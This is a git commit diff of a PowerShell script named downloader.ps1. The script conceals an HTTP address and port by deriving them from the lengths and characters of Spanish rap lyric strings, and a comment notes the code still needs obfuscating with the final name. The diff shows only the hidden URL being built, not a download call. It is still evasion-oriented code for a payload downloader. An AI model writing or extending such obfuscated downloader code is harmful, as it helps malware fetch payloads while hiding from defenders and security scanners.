874453645633601c3dc52e969694f68af715dac6
Rafa Barber <96293934+R4ph3@users.noreply.github.com>
2024-05-19 00:55:21 +0200

    Update downloader.ps1

--- downloader.ps1
+++ downloader.ps1
@@ -1,14 +1,13 @@
-$str1 = "Me acostumbre al sour, ya no patea" #34
+$str1 = "Me acostumbré al sour, ya no patea" #34
 $str2 = "Me llegan a casa, no se capean" #30
 $str3 = "Solo modelos como Barea" #23
 $str4 = "Multiplicar cienes es la tarea" #30
 $str5 = "Yo soy el cacique en tu propia aldea"
-$str6 = "Valgo mas que todo lo que te rodea" #34
+$str6 = "Valgo más que todo lo que te rodea" #34
 $str7 = "No te la crea, recuerda que Curry la mete" #41
 $str8 = "Hasta que Lebron lo galdea" #26
 
-$add = ($str7.Length - $str3.Length + 1).ToString() + ($str1.Length - $str4.Length - 2).ToString() + "." + ($str7.Length - 1 + $str4.Length + $str2.Length + $str6.Length + $str1.Length).ToString() + "." + ($str4.Length - $str2.Length).ToString() + "." + ($str7.Length - $str3.Length - 5).ToString()
-#$head = "h" + ($str1[31]).ToString() + ($str4[25]).ToString() + ($str2[26]).ToString() +  ":" + "//" + $add + ":" + ($str8.IndexOf("e")).ToString() + ($str5.IndexOf("Y")).ToString() + ($str8.IndexOf("e")).ToString() + ($str2.IndexOf("M")).ToString()
+$add = ($str7.Length - $str3.Length + 1).ToString() + ($str1.Length - $str4.Length - 2).ToString() + "." + ($str7.Length - 1 + $str4.Length + $str2.Length + $str6.Length + $str1.Length).ToString() + "." + ($str4.Length - $str2.Length).ToString() + "." + ($str1.Length + $str4.Length + $str6.Length + 2).ToString()
 $head = "h" + $str1[31] + $str4[25] + $str2[26] + "://" + $add + ":" + $str8.IndexOf("e") + $str5.IndexOf("Y") + $str8.IndexOf("e") + $str2.IndexOf("M")
 
 #falta ofuscar esto con el nombre final
